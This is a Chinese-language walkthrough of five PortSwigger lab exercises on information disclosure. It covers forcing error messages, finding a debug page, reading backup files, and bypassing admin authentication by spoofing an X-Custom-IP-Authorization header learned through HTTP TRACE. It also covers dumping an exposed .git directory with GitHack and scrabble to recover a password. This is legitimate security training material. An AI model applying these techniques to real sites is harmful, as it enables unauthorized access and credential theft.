# Information disclosure

## [Lab: Information disclosure in error messages](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages)
### 題目敘述
This lab's verbose error messages reveal that it is using a vulnerable version of a third-party framework. To solve the lab, obtain and submit the version number of this framework. 
### 題目解釋
想辦法讓他噴 Error 可能可以洩漏版本號

### 解答

```
https://acf81fed1ef0e1cbc040196e00b300c0.web-security-academy.net/product?productId=asd
```

就會噴出 `Apache Struts 2 2.3.31`


## [Lab: Information disclosure on debug page](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page)
### 題目敘述
 This lab contains a debug page that discloses sensitive information about the application. To solve the lab, obtain and submit the SECRET_KEY environment variable. 
 
### 題目解釋
可以從註解之類的地方找到隱藏的目錄

### 解答
原始碼找到一行註解
```
<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
```

裡面就有 `phpinfo` 跟 `SECRET_KEY`

## [Lab: Source code disclosure via backup files](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files)
### 題目敘述
 This lab leaks its source code via backup files in a hidden directory. To solve the lab, identify and submit the database password, which is hard-coded in the leaked source code. 
### 題目解釋
隱藏的備份檔案

### 解答

`robots.txt` 裡面有 `/backup`

裡面有一個 `java` 檔案做資料庫的連線，有寫死的密碼


## [Lab: Authentication bypass via information disclosure](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass)
### 題目敘述
 This lab's administration interface has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end.

To solve the lab, obtain the header name then use it to bypass the lab's authentication. Access the admin interface and delete Carlos's account.

You can log in to your own account using the following credentials: wiener:peter 
### 題目解釋
可以用 HTTP Trace 觀察 Debug 相關資訊

### 解答

直接到 `https://acdc1f321e9f2000c07204a300cd0083.web-security-academy.net/admin` 會說 ` Admin interface only available to local users`

```
curl -X TRACE https://acdc1f321e9f2000c07204a300cd0083.web-security-academy.net/admin
```
會噴

```
X-Custom-IP-Authorization: 111.246.72.222
```


用 Burp 送，多帶一個 `X-Custom-IP-Authorization: 127.0.0.1`

就可以直接進入了，進入後台後刪除 `carlos` 使用者



## [Lab: Information disclosure in version control history](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)
### 題目敘述
 This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the administrator user then log in and delete Carlos's account. 
### 題目解釋
`.git` 洩漏

### 解答
一點開，瀏覽器的 [DotGit](https://addons.mozilla.org/zh-TW/firefox/addon/dotgit/) 就噴ㄌ

```
python3 GitHack.py https://ac9a1ffa1eeec69dc03b1d5c00170083.web-security-academy.net/.git
cd ac9a1ffa1eeec69dc03b1d5c00170083.web-security-academy.net/
cat admin.conf
```

會輸出

```
ADMIN_PASSWORD=env('ADMIN_PASSWORD')
```

所以密碼在環境變數中

改用 [scrabble](https://github.com/denny0223/scrabble) 來看

```
./scrabble https://ac9a1ffa1eeec69dc03b1d5c00170083.web-security-academy.net
```


輸入
```
git log
```

可以觀察到有一條 `Remove admin password from config`


還原回去上一版

```
git reset HEAD^ --hard
```

再次觀察密碼

```
cat admin.conf
```

透過取得的密碼搭配帳號 `administrator` 登入後，把 `carlos` 使用者刪掉即可過關